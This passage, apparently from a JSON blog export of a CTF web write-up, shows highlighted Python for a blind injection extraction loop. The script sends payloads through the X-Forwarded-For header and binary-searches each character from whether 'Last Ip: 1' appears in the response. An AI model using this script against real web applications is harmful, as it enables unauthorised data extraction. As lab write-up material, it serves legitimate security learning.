class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;111&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;111&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125; </span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;too fast&#x27;</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;Last Ip: 1&#x27;</span>  <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            left = mid + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&#x27;Last Ip: 1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            right = mid </span><br><span class=\"line\">        mid = left + ((right-left)&gt;&gt;<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> mid == <span class=\"number\">31</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">127</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    res += <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(mid),res)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "WEB"
            ]
        }
    ]
}